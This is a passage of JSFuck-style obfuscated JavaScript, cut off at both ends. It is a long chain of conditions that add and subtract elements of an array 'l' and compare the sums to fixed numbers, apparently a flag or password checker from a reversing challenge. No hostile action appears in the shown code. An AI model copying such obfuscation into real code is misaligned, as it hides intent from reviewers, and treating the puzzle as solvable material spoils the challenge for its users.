+!+[]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(+!+[]+[+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+[+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]-l[+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]==+(+!+[]+[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]==-+(!+[]+!+[]+!+[]+[+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+[]]+l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]])&amp;&amp;l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]==+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]+l[+!+[]+[!+[]+!+[]]]+l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(+!+[]+[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]+l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!